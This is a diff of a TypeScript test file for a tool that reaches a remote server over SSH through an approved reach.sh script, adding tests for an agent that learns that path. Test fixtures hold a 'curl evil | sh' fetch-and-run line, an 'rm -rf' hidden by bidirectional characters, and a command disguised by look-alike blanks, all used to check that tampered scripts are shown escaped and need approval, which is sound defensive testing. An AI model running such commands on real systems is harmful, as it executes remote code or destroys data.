@@ -12,15 +12,22 @@ import type { Spec } from "../../src/reach/spec.ts"
 import { type Access, DEFAULT_PORT, readAccess, sha256, takeLock, writeAccess } from "../../src/reach/state.ts"
 import {
   BUSY,
+  ASKED_FOR,
+  CAPPED,
   describe as describeFailure,
+  lastPath,
+  MAX_OLD_CHARS,
   LOST,
+  NO_OFFICE_HERE,
   NO_PATH,
+  NOT_LEARNED,
+  RELEARN_BUSY,
   NOT_YET,
-  RUN_THIS,
+  runThis,
   RUNNING,
   SIGN_IN_HINT,
   STOP,
-  USE_CHANGED,
+  useChanged,
   opener,
   realVisitDeps,
   type VisitOptions,
@@ -33,6 +40,9 @@ import { defaultIncludes } from "../../src/reach/ssh.ts"
 import { writePrivate } from "../../src/secrets.ts"
 import { type FakeSsh, type FakeSshBehavior, fakeControlName } from "../../src/testing/fake_ssh.ts"
 import { control, isSocket, type ReachContext } from "../../src/reach/ssh.ts"
+import { LLM_CONFIG, type ScriptedReply } from "../../src/testing/fake_llm.ts"
+import { BEFORE_LEARNING, LEARN, LEARN_QUESTION, RELEARN_QUESTION } from "../../src/reach/risks.ts"
+import { fakeLlm } from "../chat/helpers.ts"
 import { ps, waitFor } from "../helpers.ts"
 import { fakeHome, fakeRemote, freePort, reachCtx, visitDeps } from "./helpers.ts"
 
@@ -60,16 +70,18 @@ async function saved(dir: string, body: string, over: Partial<Access> = {}): Pro
 
 const NO_JOB = (marker: string) => `touch '${marker}'\necho "no job running" >&2\nexit 3\n`
 
-test("with no reach.sh it says to start the office here or write one, exits 3 and makes nothing", async () => {
+test("without a terminal and no reach.sh it says to start the office here, learn in a terminal or write one; exits 3 and makes nothing", async () => {
   const { dir, fake } = fakeHome()
-  const { deps, errors } = visitDeps(dir, fake)
+  const { deps, errors } = visitDeps(dir, fake, { interactive: false })
   expect(await visit({ signIn: false, open: false }, deps)).toBe(3)
   const paths = new ReachPaths(dir)
   expect(errors).toEqual([NO_PATH(paths)])
-  expect(errors[0]).toStartWith(
-    "opencorp hq: no office answers here. If HQ runs on this machine, start it with `opencorp start` (`opencorp doctor` says why it's down).\n",
+  expect(errors[0]).toStartWith(`${NO_OFFICE_HERE}\n`)
+  expect(NO_OFFICE_HERE).toBe(
+    "opencorp hq: no office answers here. If HQ runs on this machine, start it with `opencorp start` (`opencorp doctor` says why it's down).",
   )
-  expect(errors[0]).toContain(`To reach HQ on another machine, write ${paths.script}`)
+  expect(errors[0]).toContain("run `opencorp hq` in a terminal to learn the way there with an agent")
+  expect(errors[0]).toContain(`or write ${paths.script}`)
   expect(fs.existsSync(paths.dir)).toBe(false)
   expect(fake.calls()).toEqual([])
 })
@@ -77,7 +89,7 @@ test("with no reach.sh it says to start the office here or write one, exits 3 an
 test("a home too long for SSH's sockets matters only once there's a reach.sh", async () => {
   const { dir, fake } = fakeHome()
   const home = path.join(dir, "a-folder-name-long-enough-to-pass-the-limit")
-  let v = visitDeps(home, fake)
+  let v = visitDeps(home, fake, { interactive: false })
   expect(await visit({ signIn: false, open: false }, v.deps)).toBe(3)
   expect(v.errors).toEqual([NO_PATH(new ReachPaths(home))])
   fs.mkdirSync(path.join(home, "hq"), { recursive: true, mode: 0o700 })
@@ -96,15 +108,16 @@ test("an owner-written reach.sh is shown whole and runs only once approved", asy
   fs.writeFileSync(paths.script, body, { mode: 0o644 })
   const { deps, prompter, errors } = visitDeps(dir, fake, { answers: ["1"] })
   expect(await visit({ signIn: false, open: false }, deps)).toBe(3)
-  expect(prompter.seen).toContain(`  touch '${marker}'`)
-  expect(prompter.seen).toContain("  exit 3")
-  expect(prompter.seen.filter((line) => line === RUN_THIS)).toHaveLength(1)
+  expect(prompter.seen).toContain(`  1  touch '${marker}'`)
+  expect(prompter.seen).toContain("  3  exit 3")
+  expect(prompter.seen.filter((line) => line === runThis(3))).toHaveLength(1)
+  expect(runThis(3)).toBe("Run this 3-line reach.sh on every visit?")
   expect(fs.readFileSync(paths.approved, "utf8")).toBe(body)
   const access = await readAccess(paths)
   expect(access).toMatchObject({ sha256: sha256(body), port: 49381, signed_in_at: null, last_used_at: null })
   expect(fs.existsSync(marker)).toBe(true)
   expect(errors).toEqual([
-    "opencorp hq: no office answers there: no job running. Start the job or the office there, or fix reach.sh if HQ moved.",
+    "opencorp hq: no office answers there: no job running. Start the job or the office there, or run `opencorp hq --relearn` if HQ moved for good.",
   ])
 })
 
@@ -161,7 +174,8 @@ test("a changed reach.sh shows the diff and asks once; no stops the visit", asyn
   const { deps, prompter, errors } = visitDeps(dir, fake, { answers: ["2"] })
   expect(await visit({ signIn: false, open: false }, deps)).toBe(1)
   expect(prompter.seen).toContain(`+touch '${marker}'`)
-  expect(prompter.seen.filter((line) => line === USE_CHANGED)).toHaveLength(1)
+  expect(prompter.seen.filter((line) => line === useChanged(4))).toHaveLength(1)
+  expect(useChanged(4)).toBe("Use the changed 4-line reach.sh on every visit?")
   expect(fs.readFileSync(paths.access, "utf8")).toBe(access)
   expect(fs.readFileSync(paths.approved, "utf8")).toBe(before)
   expect(fs.existsSync(marker)).toBe(false)
@@ -257,6 +271,8 @@ test("the first visit signs in through a redirect file and records signed_in_at"
   const access = await readAccess(paths)
   expect(access?.signed_in_at).not.toBeNull()
   expect(access?.last_used_at).not.toBeNull()
+  // What a relearn compares to keep the browser's sign-in.
+  expect(access).toMatchObject({ host: "node1", socket: remote.socket })
   v.sigint()
   expect(await v.done).toBe(0)
 })
@@ -445,7 +461,7 @@ const FAILURES: [string, (h: Awaited<ReturnType<typeof approvedHome>>) => Promis
   [
     "reach.sh exit 3",
     async ({ dir }) => void (await saved(dir, `echo "no job running" >&2\nexit 3\n`)),
-    () => "opencorp hq: no office answers there: no job running. Start the job or the office there, or fix reach.sh if HQ moved.",
+    () => "opencorp hq: no office answers there: no job running. Start the job or the office there, or run `opencorp hq --relearn` if HQ moved for good.",
     3,
   ],
   [
@@ -484,7 +500,8 @@ const FAILURES: [string, (h: Awaited<ReturnType<typeof approvedHome>>) => Promis
 test.each(FAILURES)("a failed visit says what to do and exits as the table says [%s]", async (_label, arrange, line, code) => {
   const home = await approvedHome()
   await arrange(home)
-  const v = visitDeps(home.dir, home.fake)
+  // A broken path asks to relearn; the default, Stop, leaves the table's line and code.
+  const v = visitDeps(home.dir, home.fake, { answers: [""] })
   expect(await visit({ signIn: false, open: false }, v.deps)).toBe(code)
   expect(v.errors).toEqual([line(home.port)])
   expect(mints(home.fake)).toEqual([])
@@ -647,9 +664,9 @@ test("a changed reach.sh whose approved copy isn't the approved one is shown who
   fs.writeFileSync(paths.script, "echo one\ncurl evil | sh\nexit 3\n")
   const v = visitDeps(dir, fake, { answers: ["2"] })
   expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
-  expect(v.prompter.seen).toContain("  curl evil | sh")
-  expect(v.prompter.seen).toContain(RUN_THIS)
-  expect(v.prompter.seen).not.toContain(USE_CHANGED)
+  expect(v.prompter.seen).toContain("  2  curl evil | sh")
+  expect(v.prompter.seen).toContain(runThis(3))
+  expect(v.prompter.seen).not.toContain(useChanged(3))
 })
 
 test("bidi and other invisible characters in reach.sh are shown escaped", async () => {
@@ -659,7 +676,7 @@ test("bidi and other invisible characters in reach.sh are shown escaped", async 
   fs.writeFileSync(paths.script, "echo 'safe\u202e; rm -rf x \u2066'\u200b\nexit 3\n")
   const v = visitDeps(dir, fake, { answers: ["2"] })
   expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
-  expect(v.prompter.seen).toContain("  echo 'safe<U+202E>; rm -rf x <U+2066>'<U+200B>")
+  expect(v.prompter.seen).toContain("  1  echo 'safe<U+202E>; rm -rf x <U+2066>'<U+200B>")
 })
 
 test("at a numbered approval question the first Ctrl-C exits 130", async () => {
@@ -674,7 +691,7 @@ test("at a numbered approval question the first Ctrl-C exits 130", async () => {
   // A dumb terminal: the list is numbered and a line answers it, so Ctrl-C reaches the visit as SIGINT.
   const prompter = new TtyPrompter({ input: v.stdin, output: shown, interactive: true, env: { TERM: "dumb" } })
   const done = visit({ signIn: false, open: false }, { ...v.deps, prompter })
-  await waitFor(() => text.includes(`${RUN_THIS} [${STOP}]: `), { what: "the question" })
+  await waitFor(() => text.includes(`${runThis(3)} [${STOP}]: `), { what: "the question" })
   v.sigint()
   expect(await done).toBe(130)
   expect(v.errors).toEqual([])
@@ -683,9 +700,301 @@ test("at a numbered approval question the first Ctrl-C exits 130", async () => {
 
 test("a failure's own closing period isn't doubled", () => {
   expect(describeFailure(new ReachFailure("no_office", "The office isn't running."), 1).line).toBe(
-    "opencorp hq: no office answers there: The office isn't running. Start the job or the office there, or fix reach.sh if HQ moved.",
+    "opencorp hq: no office answers there: The office isn't running. Start the job or the office there, or run `opencorp hq --relearn` if HQ moved for good.",
   )
   expect(describeFailure(new ReachFailure("not_ready", "HQ can't be reached..."), 1).line).toBe(
     "opencorp hq: HQ isn't ready there: HQ can't be reached. Run `opencorp doctor` there, or update that checkout.",
   )
+})
+
+const call = (name: string, args: unknown): ScriptedReply => ({ tool_calls: [{ name, arguments: args }] })
+const NOTES = "Log in to login1; HQ runs on node1.\n"
+
+/** A home with no reach.sh, HQ's machine reachable as node1 through login1, the fake model, and (unless `provider` is
+ *  false) hq/provider.json for it. */
+async function unlearnedHome({ provider = true, behavior = {} }: { provider?: boolean; behavior?: FakeSshBehavior } = {}) {
+  const { dir, fake } = fakeHome(behavior)
+  const remote = await fakeRemote(dir)
+  const llm = await fakeLlm()
+  const spec: Spec = { host: "node1", jump: ["login1"], opencorp: remote.opencorp }
+  const paths = new ReachPaths(dir)
+  if (provider) {
+    fs.mkdirSync(paths.dir, { mode: 0o700 })
+    await writePrivate(paths.provider, JSON.stringify({ llm_config: LLM_CONFIG, env: llm.env() }))
+  }
+  return { dir, fake, remote, llm, spec, paths, port: await freePort() }
+}
+
+test("with no saved path it shows the risks, asks, then learns and goes on with the open connection", async () => {
+  const { dir, fake, remote, llm, spec, paths, port } = await unlearnedHome()
+  const script = scriptFor(spec)
+  llm.script(
+    call("shell", { command: "ssh login1 true", why: "log in to login1" }),
+    call("save_access", { script, notes: NOTES, risks: [] }),
+    { content: "HQ is reachable from here now." },
+  )
+  const v = visitDeps(dir, fake, { answers: ["1", "1", "1"] })
+  const done = visit({ signIn: false, port, open: false }, v.deps)
+  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")) || v.errors.length > 1, { what: "the visit to connect" })
+  expect(v.errors).toEqual([NO_OFFICE_HERE])
+  expect(v.prompter.seen.slice(0, BEFORE_LEARNING.length + 1)).toEqual([...BEFORE_LEARNING, LEARN_QUESTION])
+  expect(v.prompter.offered[0]).toEqual([LEARN, STOP])
+  expect(fs.readFileSync(paths.script, "utf8")).toBe(script)
+  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
+  expect((await readAccess(paths))?.signed_in_at).not.toBeNull()
+  // save_access's connection is the visit's: one node master, not a second login.
+  expect(fake.calls().filter((argv) => argv.includes("-M"))).toHaveLength(1)
+  v.sigint()
+  expect(await done).toBe(0)
+  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
+})
+
+test("declining to learn, or a stray Enter, exits 3, calls no model and makes nothing", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome({ provider: false })
+  // The default is Stop: a model run needs an explicit choice.
+  for (const answer of ["2", ""]) {
+    const v = visitDeps(dir, fake, { answers: [answer] })
+    expect(await visit({ signIn: false, open: false }, v.deps)).toBe(3)
+    expect(v.errors).toEqual([NO_OFFICE_HERE, "opencorp hq: stopped; nothing was learned."])
+  }
+  expect(llm.requests()).toEqual([])
+  expect(fs.existsSync(paths.dir)).toBe(false)
+  expect(fake.calls()).toEqual([])
+})
+
+test("Ctrl-C at the question to learn exits 130 and makes nothing", async () => {
+  const { dir, fake, paths } = await unlearnedHome({ provider: false })
+  const v = visitDeps(dir, fake)
+  v.prompter.choose = async () => {
+    throw new KeyboardInterrupt()
+  }
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(130)
+  expect(fs.existsSync(paths.dir)).toBe(false)
+})
+
+test("the first learning run asks for the model and keeps it in hq/provider.json", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome({ provider: false })
+  llm.script({ content: "I can't tell how to reach HQ." })
+  const checked: unknown[] = []
+  // vllm at the fake model's URL: no key, the stub model.
+  const v = visitDeps(dir, fake, {
+    answers: ["1", "vllm", llm.baseUrl + "/v1", "", "stub"],
+    checkModel: async (p) => {
+      checked.push(p.llm_config)
+      return null
+    },
+  })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.prompter.seen).toContain(`Learning needs a model. Its connection is kept in ${paths.provider}, readable only by you.`)
+  expect(checked).toHaveLength(1)
+  expect(fs.statSync(paths.provider).mode & 0o777).toBe(0o600)
+  expect(fs.statSync(paths.dir).mode & 0o777).toBe(0o700)
+  expect(v.errors.at(-1)).toBe("opencorp hq: nothing was saved: I can't tell how to reach HQ.")
+  expect(fs.existsSync(paths.script)).toBe(false)
+})
+
+test("at the turn cap the visit prints the commands and saves nothing", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome()
+  llm.script(...Array.from({ length: 31 }, (_, i) => call("shell", { command: `echo ${i}`, why: "look" })))
+  const v = visitDeps(dir, fake, { answers: ["1", ...Array(31).fill("1")] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  const at = v.errors.indexOf(CAPPED)
+  expect(at).toBe(1)
+  const listed = v.errors.slice(at + 1)
+  expect(listed.length).toBeGreaterThanOrEqual(1)
+  expect(listed.length).toBeLessThanOrEqual(30)
+  expect(listed[0]).toBe("  (exit 0) echo 0")
+  expect(fs.existsSync(paths.script)).toBe(false)
+  expect(fs.existsSync(paths.access)).toBe(false)
+  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
+}, 60_000)
+
+test("--relearn gives the agent the old notes and script, and keeps the old path until the new one passes", async () => {
+  const { dir, fake, llm, spec, paths, port, remote } = await unlearnedHome()
+  const old = `set -eu\n# the old way\nssh login1 true\nprintf '%s\\n' '${JSON.stringify({ ...spec, host: "node9" })}'\n`
+  await saved(dir, old, { port, signed_in_at: new Date().toISOString() })
+  await writePrivate(paths.notes, "The job used to run on node9.\n")
+  const script = scriptFor(spec)
+  llm.script(
+    call("save_access", { script: "set -eu\nssh login1 true\nexit 1\n", notes: NOTES, risks: [] }),
+    call("shell", { command: `cat '${paths.script}' '${paths.access}'`, why: "see what's saved" }),
+    call("save_access", { script, notes: NOTES, risks: [] }),
+    { content: "HQ is on node1 now." },
+  )
+  const v = visitDeps(dir, fake, { answers: ["", "1", "1", "1"] })
+  const done = visit({ signIn: false, open: false, relearn: true }, v.deps)
+  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")) || v.errors.length > 0, { what: "the visit to connect" })
+  expect(v.errors).toEqual([])
+  expect(v.prompter.seen.slice(0, BEFORE_LEARNING.length + 1)).toEqual([...BEFORE_LEARNING, RELEARN_QUESTION])
+  const [first, , third] = llm.requests().map((r) => JSON.stringify(r))
+  expect(first).toContain("# the old way")
+  expect(first).toContain("The job used to run on node9.")
+  // After the failed save, the old script and record were still the saved ones.
+  expect(third).toContain("# the old way")
+  expect(third).toContain(sha256(old))
+  expect(fs.readFileSync(paths.script, "utf8")).toBe(script)
+  // Another host than the old path's (node9): the browser may not have a session there, so it signs in again.
+  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
+  v.sigint()
+  expect(await done).toBe(0)
+  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
+})
+
+test("--relearn without a terminal says learning needs one and runs nothing", async () => {
+  const { dir, fake } = fakeHome()
+  const marker = path.join(dir, "ran")
+  const paths = await saved(dir, NO_JOB(marker))
+  const before = fs.readFileSync(paths.access, "utf8")
+  const v = visitDeps(dir, fake, { interactive: false })
+  expect(await visit({ signIn: false, open: false, relearn: true }, v.deps)).toBe(1)
+  expect(v.errors).toEqual(["opencorp hq: learning needs a terminal; run `opencorp hq --relearn` in one."])
+  expect(fs.readFileSync(paths.access, "utf8")).toBe(before)
+  expect(fs.existsSync(marker)).toBe(false)
+  expect(fake.calls()).toEqual([])
+})
+
+test("a broken path asks to relearn with the failure, defaulting to stop", async () => {
+  const { dir, fake, llm, paths, port } = await unlearnedHome()
+  await saved(dir, `set -eu\nssh login1 true\necho "squeue: no such job" >&2\nexit 1\n`, { port })
+  const line = "opencorp hq: the saved way to reach HQ is broken: reach.sh exited 1: squeue: no such job"
+  let v = visitDeps(dir, fake, { answers: [""] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.errors).toEqual([line])
+  expect(v.prompter.seen.slice(0, BEFORE_LEARNING.length + 1)).toEqual([...BEFORE_LEARNING, RELEARN_QUESTION])
+  expect(llm.requests()).toEqual([])
+  llm.script({ content: "The job is gone; start it again." })
+  v = visitDeps(dir, fake, { answers: ["1"] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.errors).toEqual([line, "opencorp hq: nothing was saved: The job is gone; start it again."])
+  expect(JSON.stringify(llm.requests()[0])).toContain("squeue: no such job")
+  // Without a terminal there's no one to ask: the failure alone.
+  v = visitDeps(dir, fake, { interactive: false })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.errors).toEqual([line])
+  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
+})
+
+test("--relearn while another opencorp hq holds the connection says to end it first", async () => {
+  const { dir, fake, paths } = await approvedHome({}, { signed_in_at: new Date().toISOString() })
+  const v = await connected(dir, fake, { signIn: false, open: false })
+  const second = visitDeps(dir, fake)
+  expect(await visit({ signIn: false, open: false, relearn: true }, second.deps)).toBe(1)
+  expect(second.errors).toEqual([RELEARN_BUSY])
+  expect(second.opened).toEqual([])
+  v.sigint()
+  expect(await v.done).toBe(0)
+  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
+})
+
+test("while learning, login masters stay 10 minutes after their last use; afterwards a visit's stay 60 s", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome()
+  llm.script(call("shell", { command: 'grep ControlPersist "$OPENCORP_SSH_CONFIG"', why: "look" }), { content: "Done." })
+  const v = visitDeps(dir, fake, { answers: ["1", "1"] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(JSON.stringify(llm.requests()[1])).toContain("ControlPersist 600")
+  expect(fs.readFileSync(paths.config, "utf8")).toContain("\nControlPersist 60\n")
+  expect(fs.readFileSync(paths.batchConfig, "utf8")).toContain("\nControlPersist 60\n")
+})
+
+test.each(["\u00a0", "\u202f", "\u3000", "\u2028", "\u2800", "\u3164"])(
+  "an owner-written reach.sh with a look-alike blank is shown escaped, not refused [%p]",
+  async (blank) => {
+    const hex = blank.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")
+    const { dir, fake } = fakeHome()
+    const paths = new ReachPaths(dir)
+    makeDirs(paths)
+    fs.writeFileSync(paths.script, `echo listing jobs${blank}# ; touch PWNED\n${"\n".repeat(30)}exit 3\n`)
+    const v = visitDeps(dir, fake, { answers: ["2"] })
+    expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+    expect(v.prompter.seen).toContain(`   1  echo listing jobs<U+${hex}># ; touch PWNED`)
+    expect(v.prompter.seen).toContain("      (30 blank lines)")
+    expect(v.prompter.seen).toContain(runThis(32))
+    expect(v.errors).toEqual(["opencorp hq: stopped; reach.sh isn't approved."])
+  },
+)
+
+test("the old notes and script a relearn reads are cut without splitting an emoji", async () => {
+  const { dir } = fakeHome()
+  const paths = new ReachPaths(dir)
+  makeDirs(paths)
+  await writePrivate(paths.notes, `${"n".repeat(MAX_OLD_CHARS - 1)}\u{1F600}more`)
+  await writePrivate(paths.script, "exit 3\n")
+  expect(lastPath(paths)).toEqual({ notes: "n".repeat(MAX_OLD_CHARS - 1), script: "exit 3\n" })
+})
+
+test("the agent's last reply is printed without the model's key or a sign-in code", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome()
+  const key = "sk-test-0123456789abcdefghij"
+  await writePrivate(paths.provider, JSON.stringify({ llm_config: { ...LLM_CONFIG, api_key: key }, env: llm.env() }))
+  llm.script({ content: `Your key is ${key}; try http://127.0.0.1:1/pair#AbCdEfGhIjKlMnOpQrStUv` })
+  const v = visitDeps(dir, fake, { answers: ["1"] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.errors.at(-1)).toBe("opencorp hq: nothing was saved: Your key is [redacted]; try http://127.0.0.1:1/pair#[redacted]")
+})
+
+test("Ctrl-C during the first run's model check stops the check and exits 130", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome({ provider: false })
+  let started = false
+  let stopped = false
+  const v = visitDeps(dir, fake, {
+    answers: ["1", "vllm", llm.baseUrl + "/v1", "", "stub"],
+    checkModel: (_provider, signal) => {
+      started = true
+      return new Promise((resolve) =>
+        signal.addEventListener("abort", () => {
+          stopped = true
+          resolve("stopped")
+        }),
+      )
+    },
+  })
+  const done = visit({ signIn: false, open: false }, v.deps)
+  await waitFor(() => started, { what: "the model check" })
+  v.sigint()
+  expect(await done).toBe(130)
+  expect(stopped).toBe(true)
+  expect(fs.existsSync(paths.provider)).toBe(false)
+})
+
+test("a learning run that saves nothing lists the commands the model asked for", async () => {
+  const { dir, fake, llm } = await unlearnedHome()
+  llm.script(
+    call("shell", { command: "echo hi\necho there", why: "look" }),
+    call("shell", { command: "touch x", why: "try" }),
+    { content: "I can't tell." },
+  )
+  const v = visitDeps(dir, fake, { answers: ["1", "1", "2", ""] })
+  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
+  expect(v.errors).toEqual([
+    NO_OFFICE_HERE,
+    "opencorp hq: nothing was saved: I can't tell.",
+    ASKED_FOR,
+    "  (exit 0) echo hi (and 1 more line)",
+    "  (not run) touch x",
+  ])
+})
+
+test("Ctrl-C while learning lists the commands the model asked for", async () => {
+  const { dir, fake, llm } = await unlearnedHome()
+  llm.script(call("shell", { command: "true", why: "look" }), call("shell", { command: "echo started >&2; sleep 30", why: "wait" }))
+  const v = visitDeps(dir, fake, { answers: ["1", "1", "1"] })
+  const done = visit({ signIn: false, open: false }, v.deps)
+  await waitFor(() => v.echoed.join("").includes("started"), { what: "the second command" })
+  v.sigint()
+  expect(await done).toBe(130)
+  expect(v.errors.slice(1, 3)).toEqual([ASKED_FOR, "  (exit 0) true"])
+})
+
+test("--relearn with an access.json that isn't valid warns and relearns as if there were none", async () => {
+  const { dir, fake, llm, paths } = await unlearnedHome()
+  fs.writeFileSync(paths.script, "exit 3\n", { mode: 0o600 })
+  fs.writeFileSync(paths.access, "{nope", { mode: 0o600 })
+  llm.script({ content: "Nothing to learn." })
+  const v = visitDeps(dir, fake, { answers: [""] })
+  expect(await visit({ signIn: false, open: false, relearn: true }, v.deps)).toBe(1)
+  expect(v.errors).toEqual([
+    `opencorp hq: ${paths.access} isn't JSON; relearning as if there were none.`,
+    "opencorp hq: nothing was saved: Nothing to learn.",
+  ])
+  expect(llm.requests()).toHaveLength(1)
 })
